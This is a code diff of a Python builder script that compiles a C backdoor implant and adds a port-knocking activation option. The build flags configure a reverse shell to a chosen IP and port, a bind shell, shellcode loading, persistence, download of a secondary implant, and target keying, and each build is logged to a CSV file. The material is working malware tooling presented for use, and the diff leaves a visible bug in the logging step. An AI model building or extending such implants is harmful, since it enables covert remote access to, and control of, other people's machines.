@@ -4,6 +4,7 @@ import binascii
 import os
 import subprocess
 import csv
+import random
 
 parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
@@ -65,123 +66,131 @@ parser.add_argument("-static", "--static", action="store_true",
                     help="statically link the binary")
 parser.add_argument("-secImp", "--secImp", action="store_true",
                     help="download secondary implant using libcurl")
+parser.add_argument("-knock", "--knock", action="store_true",
+                    help="knock on ports")
 args = parser.parse_args()
 #print(args)
 
-cmd = ["gcc", "backdoor.c", "-o", args.outputName]
+cmd = ["gcc", "-Wall", "backdoor.c", "-o", args.outputName]
 
 arg = str(args.ipAddress)
 #DEBUG
 if args.debug:
-    cmd.insert(2, "-D DEBUG=1")
+    cmd.insert(3, "-D DEBUG=1")
 #IPADDRESS
 if args.ipAddress != "unknown":
-    cmd.insert(2, "-D VALID_IP=\"" + args.ipAddress +"\"")
+    cmd.insert(3, "-D VALID_IP=\"" + args.ipAddress +"\"")
 #DOMAIN
 if args.domain != "unknown":
-    cmd.insert(2, "-D DOMAIN=\"" + args.domain +"\"")
+    cmd.insert(3, "-D DOMAIN=\"" + args.domain +"\"")
 #PLATFORM
 if args.platform != "unknown":
-    cmd.insert(2, "-D PLATFORM=\"" + args.platform +"\"")
+    cmd.insert(3, "-D PLATFORM=\"" + args.platform +"\"")
 #ARCHITECTURE
 if args.architecture != "unknown":
-    cmd.insert(2, "-D ARCH=\"" + args.architecture +"\"")
+    cmd.insert(3, "-D ARCH=\"" + args.architecture +"\"")
 #OS
 if args.os != "unknown":
-    cmd.insert(2, "-D VALID_SYSNAME=\"" + args.os +"\"")
+    cmd.insert(3, "-D VALID_SYSNAME=\"" + args.os +"\"")
 #VERSION_NUMBER
 if args.versionNumber != "unknown":
-    cmd.insert(2, "-D VERSION_NUM=\"" + args.versionNumber +"\"")
+    cmd.insert(3, "-D VERSION_NUM=\"" + args.versionNumber +"\"")
 #PAYLOAD
 if args.payload != "unknown":
-    cmd.insert(2, "-D PAYLOAD=\"" + args.payload +"\"")
+    cmd.insert(3, "-D PAYLOAD=\"" + args.payload +"\"")
 #INTERFACE
 if args.interface is not None:
-    cmd.insert(2, "-D INTERFACE=\"" + args.interface +"\"")
+    cmd.insert(3, "-D INTERFACE=\"" + args.interface +"\"")
 #ACTIVATE
 if args.activate is not None:
-    cmd.insert(2, "-D ACTIVATE=\"" + args.activate +"\"")
+    cmd.insert(3, "-D ACTIVATE=\"" + args.activate +"\"")
 #SIZE
 if args.size is not None:
-    cmd.insert(2, "-D SIZE=\"" + args.size +"\"")
+    cmd.insert(3, "-D SIZE=\"" + args.size +"\"")
 #TRIGGER
 if args.trigger is not None:
-    cmd.insert(2, "-D TRIGGER=\"" + args.trigger +"\"")
+    cmd.insert(3, "-D TRIGGER=\"" + args.trigger +"\"")
 #DELAY
 if args.timeDelay is not None:
-    cmd.insert(2, "-D TIMEDELAY=\"" + args.timeDelay +"\"")
+    cmd.insert(3, "-D TIMEDELAY=\"" + args.timeDelay +"\"")
 #DATEDELAY
 if args.dateDelay is not None:
-    cmd.insert(2, "-D DATEDELAY=\"" + args.dateDelay +"\"")
+    cmd.insert(3, "-D DATEDELAY=\"" + args.dateDelay +"\"")
 #DOWNLOADURL
 if args.downloadURL is not None:
-    cmd.insert(2, "-D DOWNLOADURL=\"" + args.downloadURL +"\"")
+    cmd.insert(3, "-D DOWNLOADURL=\"" + args.downloadURL +"\"")
 #BANG
 if args.bang:
-    cmd.insert(2, "-D BANG=1")
+    cmd.insert(3, "-D BANG=1")
 #LOADSHELLCODE
 if args.loadShellcode:
-    cmd.insert(2, "-D LOADSHELLCODE=1")
+    cmd.insert(3, "-D LOADSHELLCODE=1")
 #REVERSESHELL
 if args.reverseShell:
-    cmd.insert(2, "-D REVERSESHELL=1")
+    cmd.insert(3, "-D REVERSESHELL=1")
 #REVERSEIP
 if args.reverseIP is not None:
-    cmd.insert(2, "-D REVERSEIP=\"" + args.reverseIP +"\"")
+    cmd.insert(3, "-D REVERSEIP=\"" + args.reverseIP +"\"")
 #REVERSEPORT
 if args.reversePort is not None:
-    cmd.insert(2, "-D REVERSEPORT=\"" + args.reversePort +"\"")
+    cmd.insert(3, "-D REVERSEPORT=\"" + args.reversePort +"\"")
 #BINDSHELL
 if args.bindShell:
-    cmd.insert(2, "-D BINDSHELL=1")
+    cmd.insert(3, "-D BINDSHELL=1")
 #BINDPORT
 if args.bindPort is not None:
-    cmd.insert(2, "-D BINDPORT=\"" + args.bindPort + "\"")
+    cmd.insert(3, "-D BINDPORT=\"" + args.bindPort + "\"")
 #PERSIST
 if args.persistence is not None:
-    cmd.insert(2, "-D PERSIST=\"" + args.persistence +"\"")
+    cmd.insert(3, "-D PERSIST=\"" + args.persistence +"\"")
 #NOTES
 if args.notes != "No Notes":
-    cmd.insert(2, "-D NOTES=\"" + args.notes +"\"")
+    cmd.insert(3, "-D NOTES=\"" + args.notes +"\"")
 #STRIP
 if args.strip:
-    cmd.insert(2, "-D STRIP=1")
+    cmd.insert(3, "-D STRIP=1")
 #STATIC
 if args.static:
-    cmd.insert(2, "-D STATIC=1")
+    cmd.insert(3, "-D STATIC=1")
 #SECONDARYIMPLANT
 if args.secImp:
-    cmd.insert(2, "-lcurl")
-    cmd.insert(2, "-D SECIMP")
+    cmd.insert(3, "-lcurl")
+    cmd.insert(3, "-D SECIMP")
 
-count = 0
-
-listOfNumbers = [] 
-
-key = 345670
-target = key
-number = 4
-while (number-1) > count: # loop generates n-1 random numbers 
+if args.knock:
+    count = 0
+    listOfNumbers = [] 
+    key = 345670
+    target = key
+    number = 4
+    while (number-1) > count: # loop generates n-1 random numbers 
             temp = random.randint(100,int(round(key/number))) #that add up to a number less than the key
             listOfNumbers.append(temp)
             count += 1
+    print(listOfNumbers)
+    #MULTI_KNOCK
+    listnum = []
+    for i in listOfNumbers:
+        listnum.append(str(i))
 
-print(listOfNumbers)
-
+    cmd.insert(3, "-D MULTI_KNOCK=\"" + str(listnum).strip(' []') + "\"")
+    cmd.insert(3,"-D NUM_PORTS=" + str(len(listOfNumbers)))
+    cmd.insert(3,"-lpcap")
 print(cmd)
 
 subprocess.run(cmd)
 #subprocess.run("./implant")
 
 
+
 with open('log.csv', mode='a+') as log_file:
 
     log_writer = csv.writer(log_file, delimiter='\t', quotechar='"', quoting=csv.QUOTE_MINIMAL)
     if (log_writer is not None):
-        fieldnamesList = ["datetime", "ipAddress", "domain", "architecture", "platform", "os", "key", "dateDelay", "timeDelay", "persistence", "loadShellcode", "reverseShell", "reverseIP", "reversePort"]
+        fieldnamesList = ["datetime", "ipAddress","SECRET_PORTS", "domain", "architecture", "platform", "os", "key", "dateDelay", "timeDelay", "persistence", "loadShellcode", "reverseShell", "reverseIP", "reversePort"]
         log_writer.writerow(fieldnamesList)
 
-    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.key), str(args.dateDelay), str(args.timeDelay), str(args.persistence), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort)])
+    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(listOfNumbers), str(args.domain), str(args.architecture), str(args.platform), str(args.os), str(args.key), str(args.dateDelay), str(args.timeDelay), str(args.persistence), str(args.loadShellcode), str(args.reverseShell), str(args.reverseIP), str(args.reversePort)])
 
 
 
